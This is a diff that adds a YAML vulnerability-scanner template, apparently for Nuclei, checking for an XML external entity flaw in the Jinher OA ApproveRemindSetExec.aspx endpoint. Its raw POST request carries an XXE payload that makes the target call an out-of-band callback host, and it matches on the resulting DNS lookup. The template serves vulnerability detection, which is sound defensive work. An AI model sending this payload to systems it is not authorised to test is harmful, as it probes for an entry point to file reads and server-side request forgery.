@@ -1,0 +1,21 @@
+id: poc-yaml-jinher-approveremindsetexec-aspx-xxe
+info:
+  name: \u91D1\u548COA ApproveRemindSetExec.aspx XXE\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dns,xxe
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{interactsh-url}}"> %remote;]>
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
